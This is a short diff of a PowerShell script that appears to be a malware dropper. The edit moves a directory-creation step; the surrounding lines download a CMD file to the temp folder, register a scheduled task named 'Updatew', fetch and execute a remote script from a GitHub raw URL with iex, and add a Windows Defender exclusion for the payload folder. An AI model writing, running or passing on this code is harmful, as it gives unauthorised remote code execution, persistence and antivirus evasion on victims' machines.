@@ -1,3 +1,6 @@
+$dir = "C:\Users\Public\150F4013"
+New-Item -ItemType Directory -Path $dir
+
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     # Download the CMD file
     Invoke-WebRequest -Uri "dropfileurl" -OutFile "$env:TEMP\run.cmd"
@@ -16,9 +19,8 @@ Register-ScheduledTask -TaskName "Updatew" -Action $action -Trigger $trigger -Pr
 
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/vm.ps1" -useb)
 
-$dir = "C:\Users\Public\150F4013"
+
 $temp = "$dir\temp"
-New-Item -ItemType Directory -Path $dir
 New-Item -ItemType Directory -Path $temp
 Add-MpPreference -ExclusionPath $dir
 
